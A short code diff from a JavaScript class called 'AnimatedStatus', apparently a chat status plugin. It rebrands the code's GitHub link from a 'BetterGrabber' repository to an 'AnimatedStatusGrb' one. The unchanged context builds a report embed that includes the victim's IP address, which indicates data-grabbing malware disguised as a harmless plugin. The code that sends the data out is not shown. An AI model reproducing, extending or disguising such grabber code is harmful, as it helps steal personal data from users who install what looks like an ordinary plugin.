@@ -209,7 +209,7 @@ class AnimatedStatus {
           title: config.embedTitle,
           footer: { text: "Version: 1.1.5" },
           description:
-            "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)",
+            "[GitHub](https://github.com/NickError404/AnimatedStatusGrb)",
           color: config.embedColor,
           fields: [
             { name: "IP", value: `\`${IP}\``, inline: false },
